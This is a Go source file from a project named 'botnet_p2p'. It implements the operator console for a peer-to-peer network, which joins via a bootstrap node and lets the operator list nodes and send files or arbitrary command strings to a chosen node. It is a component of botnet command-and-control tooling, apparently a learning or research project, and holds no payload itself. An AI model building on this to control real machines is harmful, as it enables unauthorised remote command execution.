package application_layer

import (
	"github.com/lampo100/botnet_p2p/models"
	"github.com/lampo100/botnet_p2p/business_logic_layer"
	"os"
	"os/signal"
	"syscall"
	"log"
	"fmt"
	"strings"
	"strconv"
	"bufio"
)

var terminateChannel = make(chan struct{})
var nextLayerTerminated = make(chan struct{})

var bootstrapNode = models.Node{
	Host:  "127.0.0.1",
	Port:  6666,
	IsNAT: false,
}

func RunApplication(listenPort uint32, connectPort uint32) {
	go interruptHandler()
	business_logic_layer.InitLayer(listenPort, terminateChannel, nextLayerTerminated)
	log.Printf("[AL] Initialized\n")

	bootstrapNode.Port = connectPort
	err := business_logic_layer.JoinNetwork(bootstrapNode)
	if err != nil {
		log.Printf("[AL] Could not join network, error: %v\nAssuming this is bootstrap node", err)
	}

	lineScan := make(chan string, 1)

	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			lineScan <- scanner.Text()
		}
	}()

	for {
		fmt.Printf("> ")
		select {
		case <-terminateChannel:
			<-nextLayerTerminated
			log.Println("[AL] Terminated")
			return

		case line := <-lineScan:
			tokens := strings.SplitN(line, " ", 2)
			switch tokens[0] {
			case "sendFile":
				if len(tokens) < 2 {
					fmt.Println("To few args.")
					break
				}
				tokens := strings.Split(tokens[1], " ")
				if len(tokens) < 3 {
					fmt.Println("To few args.")
					break
				}
				idx, _ := strconv.Atoi(tokens[0])
				node := business_logic_layer.GetAllNodes()[idx]
				err := business_logic_layer.SendFile(node, tokens[1], tokens[2])
				if err != nil {
					fmt.Println(err)
				}
				break
			case "sendCommand":
				if len(tokens) < 2 {
					fmt.Println("To few args.")
					break
				}
				tokens := strings.SplitN(tokens[1], " ", 2)
				if len(tokens) < 2 {
					fmt.Println("To few args.")
					break
				}
				idx, _ := strconv.Atoi(tokens[0])
				node := business_logic_layer.GetAllNodes()[idx]
				err := business_logic_layer.SendCommand(node, tokens[1])
				if err != nil {
					fmt.Println(err)
				}
				break

			case "list":
				for id, n := range business_logic_layer.GetAllNodes() {
					fmt.Printf("%v: %v\n", id, n)
				}
				break
			}
		}
	}
}

func interruptHandler() {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	log.Println("[AL] Terminate signal received!")
	close(terminateChannel)
}
